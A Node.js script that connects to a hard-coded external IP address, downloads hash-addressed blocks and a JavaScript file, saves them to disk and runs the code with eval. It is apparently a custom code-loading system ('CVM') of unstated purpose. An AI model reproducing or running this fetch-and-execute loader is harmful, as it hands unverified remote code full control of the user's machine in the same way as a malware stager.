const net = require("net");
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");

const HOST = "124.221.146.23";
const PORT = 9000;

const DOWNLOAD_FILE = 3;
const STREAM_CHILDREN = 5;

const CVM = globalThis.CVM = {
    BASE: null,
    PTR: null,

    IMP_FILE: "",
    IMP: null,
};

function sha256(data) {
    return crypto.createHash("sha256").update(data).digest();
}

function str_sha(s) {
    return sha256(Buffer.from(s));
}

function hex(data) {
    return Buffer.from(data).toString("hex");
}

function read_i32(p) {
    return p.buf.readInt32LE(p.off);
}

function block_size(p) {
    let n = read_i32(p);
    return n < 0 ? -n : n;
}

function block_data(p) {
    return p.buf.subarray(
        p.off + 4,
        p.off + 4 + block_size(p)
    );
}

function socket() {
    return new Promise(resolve => {
        let s = net.createConnection(PORT, HOST, () => resolve(s));
    });
}

function recv_all(s, n) {
    if (!s._buf)
        s._buf = Buffer.alloc(0);

    return new Promise(resolve => {
        function done() {
            if (s._buf.length < n)
                return false;

            let out = s._buf.subarray(0, n);
            s._buf = s._buf.subarray(n);

            s.off("data", ondata);

            resolve(out);
            return true;
        }

        function ondata(data) {
            s._buf = Buffer.concat([s._buf, data]);
            done();
        }

        if (done())
            return;

        s.on("data", ondata);
    });
}

async function get_first_child(parent) {
    let s = await socket();

    s.write(Buffer.from([STREAM_CHILDREN]));
    s.write(parent);

    let st = (await recv_all(s, 1))[0];

    if (st !== 0)
        throw new Error("no child: " + hex(parent));

    let child = await recv_all(s, 32);

    s.end();
    return child;
}

async function download_file(hash, ext = ".js") {
    let s = await socket();

    s.write(Buffer.from([DOWNLOAD_FILE]));
    s.write(hash);

    let st = (await recv_all(s, 1))[0];

    if (st !== 0)
        throw new Error("download failed: " + hex(hash));

    let size_buf = await recv_all(s, 4);
    let size = size_buf.readUInt32BE(0);

    let data = await recv_all(s, size);

    s.end();

    let file = hex(hash) + ext;
    let full = path.resolve(process.cwd(), file);

    fs.writeFileSync(full, data);

    return { path: full, data };
}

async function load_js(hash) {
    let file = await download_file(hash, ".js");
    return file.data.toString("utf8");
}

function execute_set(file) {
    CVM.IMP_FILE = file;

    CVM.IMP = async function () {
        await eval(CVM.IMP_FILE);
    };
}

async function execute_call(file) {
    await eval(file);
}

Object.assign(CVM, {
    sha256,
    str_sha,
    hex,

    read_i32,
    block_size,
    block_data,

    socket,
    recv_all,

    get_first_child,
    download_file,
    load_js,

    execute_set,
    execute_call,
});

async function boot() {
    console.log("boot");

    let start_key = str_sha("Cstart");
    console.log("Cstart", hex(start_key));

    let first_block_hash = await get_first_child(start_key);
    console.log("first block", hex(first_block_hash));

    let first_block = await download_file(first_block_hash, ".bin");
    console.log("first block downloaded", first_block.path);

    CVM.BASE = {
        buf: first_block.data,
        off: 0
    };

    CVM.PTR = CVM.BASE;

    let payload = block_data(CVM.PTR);
    console.log("first payload", payload.toString());

    let first_key = sha256(payload);
    console.log("first key", hex(first_key));

    let first_js_hash = await get_first_child(first_key);
    console.log("first js hash", hex(first_js_hash));

    let first_file = await load_js(first_js_hash);

    execute_set(first_file);
}

(async function main() {
    await boot();

    console.log("run first file");

    await CVM.IMP();
})();